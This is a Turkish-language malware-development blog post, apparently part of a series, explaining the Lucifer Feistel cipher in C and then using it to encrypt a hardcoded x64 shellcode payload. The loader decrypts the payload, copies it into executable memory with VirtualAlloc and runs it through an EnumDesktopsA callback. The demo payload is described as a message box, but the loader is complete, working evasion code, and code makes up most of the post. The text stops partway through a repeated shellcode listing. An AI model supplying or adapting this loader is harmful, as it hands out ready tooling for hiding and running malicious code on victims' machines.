\newpage
\subsection{96. kötü amaçlı yazılım ve kriptografi araştırması - bölüm 5 (33): Lucifer algoritmasıyla payload şifreleme. Basit C örneği.}

﷽

Merhaba, siber güvenlik meraklıları ve beyaz hackerlar!        

![kriptografi](./images/136/2024-10-20_08-01.png){width="80%"}     

Bu gönderi, kötü amaçlı yazılım geliştirmede Lucifer blok şifreleme yönteminin kullanımına dair kendi araştırmalarımın bir sonucudur. Her zamanki gibi, çeşitli kripto algoritmalarını keşfederken, bu yöntemi yük şifreleme ve şifre çözme amacıyla kullanırsak ne olacağını kontrol etmeye karar verdim.    

### Feistel ağları (Feistel networks)

Okuyucularımın isteği üzerine, Feistel ağının ne olduğunu hatırlatmak istiyorum. Bu, modern kriptografi ve şifreleme sistemlerinde hayati bir rol oynayan çok önemli bir kavramdır.    

Feistel ağı, 1971 yılında IBM Laboratuvarları'nda Horst Feistel tarafından oluşturulan bir blok şifreleme tekniğidir.    

Feistel ağı, her bloğu iki eşit parçaya bölen bir blok şifreleme yapısıdır: sol $(L)$ ve sağ $(R)$ alt bloklar. 
Sol alt blok, şu fonksiyon kullanılarak dönüştürülür: $$x = f(L,K)$$ burada $K$ anahtarı temsil eder. Bu fonksiyon, bir kaydırma şifresi gibi herhangi bir kriptografik işlem olabilir.     
Dönüştürülmüş sol alt blok daha sonra değiştirilmemiş sağ alt blok ile XOR işlemine tabi tutulur: $x = x \oplus R$.    
Bundan sonra, sol ve sağ alt bloklar yer değiştirir ve işlem birkaç tur boyunca tekrarlanır.     
Sonuç olarak, şifrelenmiş veri elde edilir.      

### Lucifer

**Lucifer**, 1970'lerde IBM'de Horst Feistel tarafından geliştirilen en erken blok şifreleme algoritmalarından biridir. `128-bit` bloklar üzerinde çalışan ve Feistel ağı kullanan bir simetrik anahtar şifresidir. Daha sonra daha popüler hale gelen `Data Encryption Standard (DES)` için temel oluşturmuştur. 

Lucifer şifrelemesinde, açık metin iki segmente ayrılır, bir segment dönüştürmeye tabi tutulur ve elde edilen çıktı diğer segment ile XOR işlemine tabi tutulur. Bu prosedür, güvenliği sağlamak için S-box'lar, permütasyonlar ve anahtar planlamaları kullanılarak birkaç iterasyon boyunca tekrarlanır.       

Lucifer'in `S-box`ları `4-bit` giriş alır ve `4-bit` çıkış üretir; `S-box` girişleri, önceki turun `S-box`larının bit permütasyonlu çıktısından türetilir, ilk turda ise `S-box` girişleri açık metindir. Özel bir bit, mevcut iki `S-box`tan hangisinin seçileceğini belirlemek için kullanılır. Lucifer, `9` giriş biti ve `8` çıkış biti içeren tek bir `T-box` olarak tanımlanır. DES'ten farklı olarak, turlar arasında değişim yoktur ve blok yarıları kullanılmaz. Lucifer `16` tur kullanır, `128-bit` bloklar üzerinde çalışır ve `DES`'ten daha az karmaşık bir anahtar planlamasına sahiptir.


### pratik örnek 1

Bunu pratikte uygulayalım. Öncelikle, yardımcı fonksiyonları, sabitleri ve makroları tanımlamamız gerekiyor:    

```cpp
#define block_size 16 // 128 bit
#define key_size 16   // 128 bit

static const unsigned char s0[16] = {
  0x0C, 0x0F, 0x07, 0x0A, 0x0E, 0x0D, 0x0B, 0x00,
  0x02, 0x06, 0x03, 0x01, 0x09, 0x04, 0x05, 0x08
};

static const unsigned char s1[16] = {
  0x07, 0x02, 0x0E, 0x09, 0x03, 0x0B, 0x00, 0x04,
  0x0C, 0x0D, 0x01, 0x0A, 0x06, 0x0F, 0x08, 0x05
};

static const unsigned char m1[8] = {
  0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01
};

static const unsigned char m2[8] = {
  0x7F, 0xBF, 0xDF, 0xEF, 0xF7, 0xFB, 0xFD, 0xFE
};

// macro to perform bitwise shifts
#define shift_left(x, n) ((x) << (n))
#define shift_right(x, n) ((unsigned char)(x) >> (n))

// extract high and low nibbles
#define highsubbyte(x) shift_right((x), 4)
#define lowsubbyte(x) ((x) & 0x0F)

// swap function for char types
void swap(char* arg1, char* arg2) {
  char tmp = *arg1;
  *arg1 = *arg2;
  *arg2 = tmp;
}
```

Daha sonra ana şifreleme fonksiyonuna ihtiyacımız var.     
Hadi, Lucifer şifreleme fonksiyonumuzu adım adım açıklayayım.     

Bu fonksiyon, `128-bit`lik bir blok (`16 bayt`) ve bir anahtar alır. Blok iki eşit yarıya bölünür: `lower_half` (ilk 8 bayt) ve `upper_half` (son 8 bayt):    

```cpp
char* lower_half = block;
char* upper_half = block + block_size / 2;
```

Eğer şifre çözme işlemi yapılıyorsa, başlangıç anahtar bayt indeksi `8` olarak ayarlanır, aksi takdirde `0` olarak başlar. Şifreleme veya şifre çözme işlemi sırasında toplam `16` tur gerçekleştirilir:    

```cpp
int key_byte_idx = decrypt ? 8 : 0;
const int round_count = 16;
```

`16 tur` boyunca dönüşümler için bir döngü başlatıyoruz. Eğer şifre çözme işlemi yapılıyorsa, her turdan sonra anahtar indeksi `1` artırılır ve `16`ya ulaştığında modül kullanılarak başa döndürülür:     

```cpp
for (int round = 0; round < round_count; ++round) {
  if (decrypt) {
    key_byte_idx = (key_byte_idx + 1) % round_count;
  }
```

Her turda, `8 adım` işlenir (üst yarıdaki her bayt için bir adım). Burada, `message_byte`, bu adımda işlediğimiz `upper_half` içindeki bayttır:     

```cpp
for (int step = 0; step < 8; ++step) {
  char message_byte = upper_half[step];
```

Bu blok, karıştırma (confusion) adımını uygular. Anahtar baytına ve adıma bağlı olarak, `message_byte`'ı değiştirmek için `s0` veya `s1` değiştirme kutularının (S-box) kullanılacağı belirlenir. Bu işlem, Feistel ağlarındaki `S-box` kullanımına benzer:    

```cpp
if (key[transform_control_byte_idx] & m1[step_count - step - 1]) {
  message_byte = shift_left(s1[highsubbyte(message_byte)], 4) | s0[lowsubbyte
  (message_byte)];
} else {
  message_byte = shift_left(s0[highsubbyte(message_byte)], 4) | s1[lowsubbyte
  (message_byte)];
}
```

Daha sonra, anahtar kesme mantığı uygulanır:    

```cpp
message_byte ^= key[key_byte_idx];
```

Burada, dönüştürülmüş bayt anahtar baytı ile `XOR` işlemine tabi tutulur. Bu işlem, şifrelemeye ek karmaşıklık katar ve mesajın her baytının anahtar tarafından etkilenmesini sağlar.      

Sonraki adım, `message_byte` içindeki bitlerin önceden tanımlanmış maskelere (`m1`) göre sola veya sağa kaydırıldığı permütasyon adımıdır. Bu adım, bitleri karıştırarak her bitin tüm bayt üzerinde etkisini yaymasını sağlar:   

```cpp
message_byte = (shift_right(message_byte & m1[0], 3)) |
               (shift_right(message_byte & m1[1], 4)) |
               (shift_left(message_byte & m1[2], 2)) |
               (shift_right(message_byte & m1[3], 1)) |
               (shift_left(message_byte & m1[4], 2)) |
               (shift_left(message_byte & m1[5], 4)) |
               (shift_right(message_byte & m1[6], 1)) |
               (shift_left(message_byte & m1[7], 1));
```

Ortaya çıkan `message_byte`, `lower_half`'ın çeşitli bitleri ile `XOR` işlemine tabi tutulur. Bu, değişikliklerin `lower_half` boyunca yayılmasını sağlar ve turlar ilerledikçe blokun her iki yarısının birbirini etkilemesini garanti eder:     

```cpp
lower_half[(7 + step) % step_count] = 
((message_byte ^ lower_half[(7 + step) % step_count]) & 
m1[0]) | (lower_half[(7 + step) % step_count] & m2[0]);
// diğer bitler için benzer mantık tekrarlanır...
```

Daha sonra, `key_byte_idx` artırılır, böylece bir sonraki adımda farklı bir anahtar baytı kullanılır. Eğer şifre çözme işlemi yapılmıyorsa, bu işlem son adım hariç tüm adımlar için gerçekleşir:     

```cpp
if (step < step_count - 1 || decrypt) {
  key_byte_idx = (key_byte_idx + 1) % round_count;
}
```

Her turun sonunda, `lower_half` ve `upper_half` yer değiştirilir. Bu, Feistel ağının temel tasarım prensiplerinden biridir ve blokun her iki yarısının sonraki turda işlenmesini sağlar:     

```cpp
for (int i = 0; i < block_size / 2; ++i) {
  swap(&lower_half[i], &upper_half[i]);
}
```

Tüm turlar tamamlandıktan sonra, şifreleme işlemini bitirmek için yarılar tekrar değiştirilir. Bu, nihai şifrelenmiş bloğun Feistel tasarımına uygun olmasını sağlar:   

```cpp
for (int i = 0; i < block_size / 2; ++i) {
  swap(&block[i], &block[i + block_size / 2]);
}
```

Bu fonksiyonun tam kaynak kodu şu şekilde görünüyor:    

```cpp
void Lucifer(char block[block_size], char key[key_size], bool decrypt) {
  char* lower_half = block;
  char* upper_half = block + block_size / 2;
  
  int key_byte_idx = decrypt ? 8 : 0;
  const int round_count = 16;
  
  for (int round = 0; round < round_count; ++round) {
    if (decrypt) {
      key_byte_idx = (key_byte_idx + 1) % round_count;
    }
    
    int transform_control_byte_idx = key_byte_idx;
    const int step_count = 8;
    
    for (int step = 0; step < step_count; ++step) {
      char message_byte = upper_half[step];
      
      // confusion
      if (key[transform_control_byte_idx] & m1[step_count - step - 1]) {
        message_byte = shift_left(s1[highsubbyte(message_byte)], 4) | s0
        [lowsubbyte(message_byte)];
      } else {
        message_byte = shift_left(s0[highsubbyte(message_byte)], 4) | s1
        [lowsubbyte(message_byte)];
      }
      
      // key interruption
      message_byte ^= key[key_byte_idx];
      
      // permutation
      message_byte = (shift_right(message_byte & m1[0], 3)) |
               (shift_right(message_byte & m1[1], 4)) |
               (shift_left(message_byte & m1[2], 2)) |
               (shift_right(message_byte & m1[3], 1)) |
               (shift_left(message_byte & m1[4], 2)) |
               (shift_left(message_byte & m1[5], 4)) |
               (shift_right(message_byte & m1[6], 1)) |
               (shift_left(message_byte & m1[7], 1));
      
      // diffusion
      lower_half[(7 + step) % step_count] = ((message_byte ^ lower_half[(7 + 
      step) % step_count]) & m1[0]) | (lower_half[(7 + step) % step_count] & 
      m2[0]);
      lower_half[(6 + step) % step_count] = ((message_byte ^ lower_half[(6 + 
      step) % step_count]) & m1[1]) | (lower_half[(6 + step) % step_count] & 
      m2[1]);
      lower_half[(2 + step) % step_count] = ((message_byte ^ lower_half[(2 + 
      step) % step_count]) & m1[2]) | (lower_half[(2 + step) % step_count] & 
      m2[2]);
      lower_half[(1 + step) % step_count] = ((message_byte ^ lower_half[(1 + 
      step) % step_count]) & m1[3]) | (lower_half[(1 + step) % step_count] & 
      m2[3]);
      lower_half[(5 + step) % step_count] = ((message_byte ^ lower_half[(5 + 
      step) % step_count]) & m1[4]) | (lower_half[(5 + step) % step_count] & 
      m2[4]);
      lower_half[(0 + step) % step_count] = ((message_byte ^ lower_half[(0 + 
      step) % step_count]) & m1[5]) | (lower_half[(0 + step) % step_count] & 
      m2[5]);
      lower_half[(3 + step) % step_count] = ((message_byte ^ lower_half[(3 + 
      step) % step_count]) & m1[6]) | (lower_half[(3 + step) % step_count] & 
      m2[6]);
      lower_half[(4 + step) % step_count] = ((message_byte ^ lower_half[(4 + 
      step) % step_count]) & m1[7]) | (lower_half[(4 + step) % step_count] & 
      m2[7]);
      
      if (step < step_count - 1 || decrypt) {
        key_byte_idx = (key_byte_idx + 1) % round_count;
      }
    }
    
    // swap halves
    for (int i = 0; i < block_size / 2; ++i) {
      swap(&lower_half[i], &upper_half[i]);
    }
  }
  
  // physically swap halves
  for (int i = 0; i < block_size / 2; ++i) {
    swap(&block[i], &block[i + block_size / 2]);
  }
}
```

Böylece, fonksiyon `128-bit`lik bir bloğu `16` tur boyunca karıştırma (confusion), yayılma (diffusion) ve permütasyon işlemlerine tabi tutar.     
Her turda `upper_half` içindeki baytlar değiştirilir ve yapılan değişiklikler `lower_half` boyunca yayılır.    
Anahtar, her adımda `S-box` değiştirmeleri ve `XOR` işlemlerini kontrol etmek için kullanılır.    
Blokun yarıları her turun sonunda yer değiştirir, bu da Feistel ağı tasarımına uygun olur.      

Ve son olarak, açık metin bloğunu nasıl şifreleyebileceğimizin tam kaynak kodu şu şekilde görünüyor (`hack.c`):    

```cpp
/*
 * hack.c
 * Lucifer encryption example
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2024/10/20/malware-cryptography-33.html
 */
#include <stdio.h>
#include <stdbool.h>
#include <string.h>

#define block_size 16 // 128 bit
#define key_size 16   // 128 bit

static const unsigned char s0[16] = {
  0x0C, 0x0F, 0x07, 0x0A, 0x0E, 0x0D, 0x0B, 0x00,
  0x02, 0x06, 0x03, 0x01, 0x09, 0x04, 0x05, 0x08
};

static const unsigned char s1[16] = {
  0x07, 0x02, 0x0E, 0x09, 0x03, 0x0B, 0x00, 0x04,
  0x0C, 0x0D, 0x01, 0x0A, 0x06, 0x0F, 0x08, 0x05
};

static const unsigned char m1[8] = {
  0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01
};

static const unsigned char m2[8] = {
  0x7F, 0xBF, 0xDF, 0xEF, 0xF7, 0xFB, 0xFD, 0xFE
};

// macro to perform bitwise shifts
#define shift_left(x, n) ((x) << (n))
#define shift_right(x, n) ((unsigned char)(x) >> (n))

// extract high and low nibbles
#define highsubbyte(x) shift_right((x), 4)
#define lowsubbyte(x) ((x) & 0x0F)

// swap function for char types
void swap(char* arg1, char* arg2) {
  char tmp = *arg1;
  *arg1 = *arg2;
  *arg2 = tmp;
}

void Lucifer(char block[block_size], char key[key_size], bool decrypt) {
  char* lower_half = block;
  char* upper_half = block + block_size / 2;
  
  int key_byte_idx = decrypt ? 8 : 0;
  const int round_count = 16;
  
  for (int round = 0; round < round_count; ++round) {
    if (decrypt) {
      key_byte_idx = (key_byte_idx + 1) % round_count;
    }
    
    int transform_control_byte_idx = key_byte_idx;
    const int step_count = 8;
    
    for (int step = 0; step < step_count; ++step) {
      char message_byte = upper_half[step];
      
      // confusion
      if (key[transform_control_byte_idx] & m1[step_count - step - 1]) {
        message_byte = shift_left(s1[highsubbyte(message_byte)], 4) | s0
        [lowsubbyte(message_byte)];
      } else {
        message_byte = shift_left(s0[highsubbyte(message_byte)], 4) | s1
        [lowsubbyte(message_byte)];
      }
      
      // key interruption
      message_byte ^= key[key_byte_idx];
      
      // permutation
      message_byte = (shift_right(message_byte & m1[0], 3)) |
               (shift_right(message_byte & m1[1], 4)) |
               (shift_left(message_byte & m1[2], 2)) |
               (shift_right(message_byte & m1[3], 1)) |
               (shift_left(message_byte & m1[4], 2)) |
               (shift_left(message_byte & m1[5], 4)) |
               (shift_right(message_byte & m1[6], 1)) |
               (shift_left(message_byte & m1[7], 1));
      
      // diffusion
      lower_half[(7 + step) % step_count] = ((message_byte ^ lower_half[(7 + 
      step) % step_count]) & m1[0]) | (lower_half[(7 + step) % step_count] & 
      m2[0]);
      lower_half[(6 + step) % step_count] = ((message_byte ^ lower_half[(6 + 
      step) % step_count]) & m1[1]) | (lower_half[(6 + step) % step_count] & 
      m2[1]);
      lower_half[(2 + step) % step_count] = ((message_byte ^ lower_half[(2 + 
      step) % step_count]) & m1[2]) | (lower_half[(2 + step) % step_count] & 
      m2[2]);
      lower_half[(1 + step) % step_count] = ((message_byte ^ lower_half[(1 + 
      step) % step_count]) & m1[3]) | (lower_half[(1 + step) % step_count] & 
      m2[3]);
      lower_half[(5 + step) % step_count] = ((message_byte ^ lower_half[(5 + 
      step) % step_count]) & m1[4]) | (lower_half[(5 + step) % step_count] & 
      m2[4]);
      lower_half[(0 + step) % step_count] = ((message_byte ^ lower_half[(0 + 
      step) % step_count]) & m1[5]) | (lower_half[(0 + step) % step_count] & 
      m2[5]);
      lower_half[(3 + step) % step_count] = ((message_byte ^ lower_half[(3 + 
      step) % step_count]) & m1[6]) | (lower_half[(3 + step) % step_count] & 
      m2[6]);
      lower_half[(4 + step) % step_count] = ((message_byte ^ lower_half[(4 + 
      step) % step_count]) & m1[7]) | (lower_half[(4 + step) % step_count] & 
      m2[7]);
      
      if (step < step_count - 1 || decrypt) {
        key_byte_idx = (key_byte_idx + 1) % round_count;
      }
    }
    
    // swap halves
    for (int i = 0; i < block_size / 2; ++i) {
      swap(&lower_half[i], &upper_half[i]);
    }
  }
  
  // physically swap halves
  for (int i = 0; i < block_size / 2; ++i) {
    swap(&block[i], &block[i + block_size / 2]);
  }
}

int main() {
  char message[block_size + 1] = "meowmeowmeowmeow";  // 16 characters + null 
  // terminator
  char key[key_size] = "abcdefghijklmnop";      // example 128-bit key

  message[block_size] = '\0';  // add a null terminator at the end of the 
  // message

  printf("original block: %s\n", message);

  Lucifer(message, key, false);  // encrypt
  printf("encrypted block: ");
  for (int i = 0; i < block_size; i++) {
    printf("%02x ", (unsigned char)message[i]);
  }
  printf("\n");

  Lucifer(message, key, true);  // decrypt
  printf("decrypted block: %s\n", message);

  return 0;
}
```

Gördüğünüz gibi, ana fonksiyonda sadece `meowmeowmeowmeow` mesajını şifreledim.     

### demo 1

Hadi bu kodun nasıl çalıştığını görelim. Linux için derleyelim:       

```bash
gcc hack.c -o hack
```

![kriptografi](./images/136/2024-10-19_18-06.png){width="80%"}     

Daha sonra çalıştırın:    

```bash
./hack
```

![kriptografi](./images/136/2024-10-21_06-26.png){width="80%"}     

Gördüğünüz gibi, bu durumda her şey mükemmel çalıştı.     

### pratik örnek 2

Bunu başka bir mantıkla uygulayalım: yükü şifreleyelim, çözelim ve çalıştıralım.     

Bunun kaynak kodu ilk örneğe benziyor, tek fark iki yeni fonksiyon eklenmiş olması:     

```cpp
// payload encryption function
void lucifer_encrypt_payload(unsigned char* payload, int payload_len, 
unsigned char* key) {
  for (int i = 0; i < payload_len / block_size; i++) {
    Lucifer((char*)(payload + i * block_size), (char*)key, false);
  }
}

// payload decryption function
void lucifer_decrypt_payload(unsigned char* payload, int payload_len, 
unsigned char* key) {
  for (int i = 0; i < payload_len / block_size; i++) {
    Lucifer((char*)(payload + i * block_size), (char*)key, true);
  }
}
```

Bu kod sürümü, `hack.c` dosyasındaki fonksiyonu kullanarak Lucifer şifrelemesini doğru şekilde uygular ve yük bloklarına şifreleme ve şifre çözme işlemini uygular. `Lucifer` fonksiyonu, `lucifer_encrypt_payload` ve `lucifer_decrypt_payload` içinde entegre edilmiştir, böylece doğru şifreleme akışı sağlanır.     

Tam kaynak kodu şu şekilde görünüyor (`hack2.c`):    

```cpp
/*
 * hack.c
 * Lucifer payload encryption/decryption
 * author: @cocomelonc
 * https://cocomelonc.github.io/malware/2024/10/20/malware-cryptography-33.html
 */
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <windows.h>

#define block_size 16 // 128 bit
#define key_size 16   // 128 bit

static const unsigned char s0[16] = {
  0x0C, 0x0F, 0x07, 0x0A, 0x0E, 0x0D, 0x0B, 0x00,
  0x02, 0x06, 0x03, 0x01, 0x09, 0x04, 0x05, 0x08
};

static const unsigned char s1[16] = {
  0x07, 0x02, 0x0E, 0x09, 0x03, 0x0B, 0x00, 0x04,
  0x0C, 0x0D, 0x01, 0x0A, 0x06, 0x0F, 0x08, 0x05
};

static const unsigned char m1[8] = {
  0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01
};

static const unsigned char m2[8] = {
  0x7F, 0xBF, 0xDF, 0xEF, 0xF7, 0xFB, 0xFD, 0xFE
};

#define shift_left(x, n) ((x) << (n))
#define shift_right(x, n) ((unsigned char)(x) >> (n))
#define highsubbyte(x) shift_right((x), 4)
#define lowsubbyte(x) ((x) & 0x0F)

void swap(char* arg1, char* arg2) {
  char tmp = *arg1;
  *arg1 = *arg2;
  *arg2 = tmp;
}

void Lucifer(char block[block_size], char key[key_size], bool decrypt) {
  char* lower_half = block;
  char* upper_half = block + block_size / 2;

  int key_byte_idx = decrypt ? 8 : 0;
  const int round_count = 16;

  for (int round = 0; round < round_count; ++round) {
    if (decrypt) {
      key_byte_idx = (key_byte_idx + 1) % round_count;
    }

    int transform_control_byte_idx = key_byte_idx;
    const int step_count = 8;

    for (int step = 0; step < step_count; ++step) {
      char message_byte = upper_half[step];

      // confusion
      if (key[transform_control_byte_idx] & m1[step_count - step - 1]) {
        message_byte = shift_left(s1[highsubbyte(message_byte)], 4) | s0
        [lowsubbyte(message_byte)];
      } else {
        message_byte = shift_left(s0[highsubbyte(message_byte)], 4) | s1
        [lowsubbyte(message_byte)];
      }

      // key interruption
      message_byte ^= key[key_byte_idx];

      // permutation
      message_byte = (shift_right(message_byte & m1[0], 3)) |
               (shift_right(message_byte & m1[1], 4)) |
               (shift_left(message_byte & m1[2], 2)) |
               (shift_right(message_byte & m1[3], 1)) |
               (shift_left(message_byte & m1[4], 2)) |
               (shift_left(message_byte & m1[5], 4)) |
               (shift_right(message_byte & m1[6], 1)) |
               (shift_left(message_byte & m1[7], 1));

      // diffusion
      lower_half[(7 + step) % step_count] = ((message_byte ^ lower_half[(7 + 
      step) % step_count]) & m1[0]) | (lower_half[(7 + step) % step_count] & 
      m2[0]);
      lower_half[(6 + step) % step_count] = ((message_byte ^ lower_half[(6 + 
      step) % step_count]) & m1[1]) | (lower_half[(6 + step) % step_count] & 
      m2[1]);
      lower_half[(2 + step) % step_count] = ((message_byte ^ lower_half[(2 + 
      step) % step_count]) & m1[2]) | (lower_half[(2 + step) % step_count] & 
      m2[2]);
      lower_half[(1 + step) % step_count] = ((message_byte ^ lower_half[(1 + 
      step) % step_count]) & m1[3]) | (lower_half[(1 + step) % step_count] & 
      m2[3]);
      lower_half[(5 + step) % step_count] = ((message_byte ^ lower_half[(5 + 
      step) % step_count]) & m1[4]) | (lower_half[(5 + step) % step_count] & 
      m2[4]);
      lower_half[(0 + step) % step_count] = ((message_byte ^ lower_half[(0 + 
      step) % step_count]) & m1[5]) | (lower_half[(0 + step) % step_count] & 
      m2[5]);
      lower_half[(3 + step) % step_count] = ((message_byte ^ lower_half[(3 + 
      step) % step_count]) & m1[6]) | (lower_half[(3 + step) % step_count] & 
      m2[6]);
      lower_half[(4 + step) % step_count] = ((message_byte ^ lower_half[(4 + 
      step) % step_count]) & m1[7]) | (lower_half[(4 + step) % step_count] & 
      m2[7]);

      if (step < step_count - 1 || decrypt) {
        key_byte_idx = (key_byte_idx + 1) % round_count;
      }
    }

    // swap halves
    for (int i = 0; i < block_size / 2; ++i) {
      swap(&lower_half[i], &upper_half[i]);
    }
  }

  // physically swap halves
  for (int i = 0; i < block_size / 2; ++i) {
    swap(&block[i], &block[i + block_size / 2]);
  }
}

// payload encryption function
void lucifer_encrypt_payload(unsigned char* payload, int payload_len, 
unsigned char* key) {
  for (int i = 0; i < payload_len / block_size; i++) {
    Lucifer((char*)(payload + i * block_size), (char*)key, false);
  }
}

// payload decryption function
void lucifer_decrypt_payload(unsigned char* payload, int payload_len, 
unsigned char* key) {
  for (int i = 0; i < payload_len / block_size; i++) {
    Lucifer((char*)(payload + i * block_size), (char*)key, true);
  }
}

int main() {
  unsigned char key[16] = "meowmeowbowwoow"; // example 128-bit key
  unsigned char my_payload[] = {
    0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x0, 0x0,
    0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
    0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
    0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0xf, 0xb7, 0x4a,
    0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2,
    0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52,
    0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
    0x1, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0,
    0x74, 0x6f, 0x48, 0x1, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
    0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
    0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75,
    0xf1, 0x3e, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd6,
    0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x3e, 0x41,
    0x8b, 0xc, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x3e,
    0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
    0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
    0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
    0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x0, 0x0, 0x0,
    0x0, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x0, 0x0, 0x0, 0x3e, 0x4c, 0x8d,
    0x85, 0x9, 0x1, 0x0, 0x0, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
    0x56, 0x7, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2,
    0x56, 0xff, 0xd5, 0x4d, 0x65, 0x6f, 0x77, 0x2d, 0x6d, 0x65, 0x6f, 0x77,
    0x21, 0x0, 0x3d, 0x5e, 0x2e, 0x2e, 0x5e, 0x3d, 0x0
  };

  int my_payload_len = sizeof(my_payload);
  int pad_len = my_payload_len + (block_size - my_payload_len % block_size) % 
  block_size;

  unsigned char padded[pad_len];
  memset(padded, 0x90, pad_len);  // pad with NOPs (0x90)
  memcpy(padded, my_payload, my_payload_len);

  printf("original payload: ");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", my_payload[i]);
  }
  printf("\n\n");

  // encrypt the payload
  lucifer_encrypt_payload(padded, pad_len, key);

  printf("encrypted payload: ");
  for (int i = 0; i < pad_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  // decrypt the payload
  lucifer_decrypt_payload(padded, pad_len, key);

  printf("decrypted payload: ");
  for (int i = 0; i < my_payload_len; i++) {
    printf("%02x ", padded[i]);
  }
  printf("\n\n");

  LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT, 
  PAGE_EXECUTE_READWRITE);
  RtlMoveMemory(mem, padded, my_payload_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
  return 0;
}
```

Her zamanki gibi, burada `meow-meow` mesaj kutusu payload kullanılmıştır:    

```cpp
unsigned char my_payload[] = {
  0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x0, 0x0,
  0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
  0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
  0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0xf, 0xb7, 0x4a,
  0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2,
  0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52,
  0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
  0x1, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0,
  0x74, 0x6f, 0x48, 0x1, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
  0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
  0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75,
  0xf1, 0x3e, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd6,
  0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x3e, 0x41,
  0x8b, 0xc, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x3e,
  0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
  0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
  0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
  0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x0, 0x0, 0x0,
  0x0, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x0, 0x0, 0x0, 0x3e, 0x4c, 0x8d,
  0x85, 0x9, 0x1, 0x0, 0x0, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
  0x56, 0x7, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2,
